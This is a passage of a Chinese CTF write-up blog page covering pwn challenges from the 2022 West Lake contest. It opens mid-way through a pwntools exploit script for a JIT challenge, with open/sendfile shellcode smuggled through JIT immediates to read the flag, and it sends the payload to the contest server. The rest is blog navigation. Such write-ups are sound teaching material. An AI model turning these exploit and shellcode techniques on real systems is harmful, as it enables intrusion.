class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(arg_cnt):</span><br><span class="line">            payload += p8(args[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span>(<span class="params">idx1,idx2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">2</span>)</span><br><span class="line">    payload += p8(idx1)</span><br><span class="line">    payload += p8(idx2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">idx1,idx2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">5</span>)</span><br><span class="line">    payload += p8(idx1)</span><br><span class="line">    payload += p8(idx2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retv</span>(<span class="params">var_idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0</span>)</span><br><span class="line">    payload += p8(var_idx)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;mov eax, 0x01010101</span></span><br><span class="line"><span class="string">xor eax, 0x6c662f2e ^ 0x01010101</span></span><br><span class="line"><span class="string">mov ebx, 0x0101</span></span><br><span class="line"><span class="string">xor ebx, 0x6761 ^ 0x0101</span></span><br><span class="line"><span class="string">shl rbx,32</span></span><br><span class="line"><span class="string">or rax,rbx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push SYS_open</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x7fffffff</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ret_off = <span class="number">0x80</span> | <span class="number">0x20</span></span><br><span class="line">create_func(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">mov(<span class="number">0x81</span>,ret_off)</span><br><span class="line">mov_var_imm(<span class="number">0x82</span>,<span class="number">0x62</span>)</span><br><span class="line">xor(<span class="number">0x81</span>,<span class="number">0x82</span>)</span><br><span class="line">mov(ret_off,<span class="number">0x81</span>)</span><br><span class="line">retv(<span class="number">0x81</span>)</span><br><span class="line"></span><br><span class="line">create_func(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_qword</span>(<span class="params">sc</span>):</span></span><br><span class="line">    payload = asm(sc).ljust(<span class="number">6</span>,<span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xeb\x09&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> u64(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sc.splitlines():</span><br><span class="line">    mov_var_imm(<span class="number">1</span>,make_qword(i))</span><br><span class="line">retv(<span class="number">0x81</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./jit&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="string">&#x27;21128&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/wp/" rel="tag"><i class="ic i-tag"></i> wp</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-02-03 23:15:51" itemprop="dateModified" datetime="2023-02-03T23:15:51+08:00">2023-02-03</time>
+  </span>
+  <span id="2023/02/03/西湖论剑/" class="item leancloud_visitors" data-flag-title="2022西湖论剑pwn部分wp" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="Loτυs 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="Loτυs 支付宝">
+        <p>支付宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>Loτυs <i class="ic i-at"><em>@</em></i>清風微醺
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://www.wdqjxtmph.top/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="2022西湖论剑pwn部分wp">https://www.wdqjxtmph.top/2023/02/03/西湖论剑/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/12/01/hitcon-wtfshell/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c25091be43e0d30ef41a48.webp" title="hitcon2022-wtfshell">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> CTF赛题复现</span>
+  <h3>hitcon2022-wtfshell</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#message-board"><span class="toc-number"></span> <span class="toc-text"> Message Board</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babycalc"><span class="toc-number"></span> <span class="toc-text"> babycalc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jit"><span class="toc-number"></span> <span class="toc-text"> Jit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91"><span class="toc-number">1.</span> <span class="toc-text"> 基本逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 利用手法</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2021/08/20/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li><li><a href="/2021/09/03/babyrop/" rel="bookmark" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></li><li><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="bookmark" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></li><li><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" rel="bookmark" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></li><li><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="bookmark" title="电科新生赛">电科新生赛</a></li><li><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" rel="bookmark" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></li><li><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" rel="bookmark" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></li><li><a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" rel="bookmark" title="利用realloc调整栈使one_gadget生效">利用realloc调整栈使one_gadget生效</a></li><li><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" rel="bookmark" title="Tcachebin 总结">Tcachebin 总结</a></li><li><a href="/2022/04/06/wustctf2020_babyfmt/" rel="bookmark" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></li><li><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" rel="bookmark" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></li><li><a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" rel="bookmark" title="DSCTF pwn 部分wp">DSCTF pwn 部分wp</a></li><li><a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" rel="bookmark" title="DASCTF7月赋能赛pwn wp">DASCTF7月赋能赛pwn wp</a></li><li><a href="/2022/08/03/2022qwb/" rel="bookmark" title="2022强网杯pwn部分wp">2022强网杯pwn部分wp</a></li><li><a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" rel="bookmark" title="2022巅峰极客pwn wp">2022巅峰极客pwn wp</a></li><li><a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" rel="bookmark" title="羊城杯pwn wp">羊城杯pwn wp</a></li><li class="active"><a href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="bookmark" title="2022西湖论剑pwn部分wp">2022西湖论剑pwn部分wp</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="Loτυs"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">Loτυs</p>
+  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">20</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">3</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/07/24/DASCTF7%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9Bpwn%20wp/" title="DASCTF7月赋能赛pwn wp">DASCTF7月赋能赛pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/07/11/2022%E8%93%9D%E5%B8%BDpwn%20wp/" title="2022蓝帽pwn wp">2022蓝帽pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" title="DSCTF pwn 部分wp">DSCTF pwn 部分wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="堆学习-UAF">堆学习-UAF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="分类于 CTF赛题复现">CTF赛题复现</a>
+</div>
+
+    <span><a href="/2022/12/01/hitcon-wtfshell/" title="hitcon2022-wtfshell">hitcon2022-wtfshell</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Loτυs @ Loτυs</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/02/03/西湖论剑/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
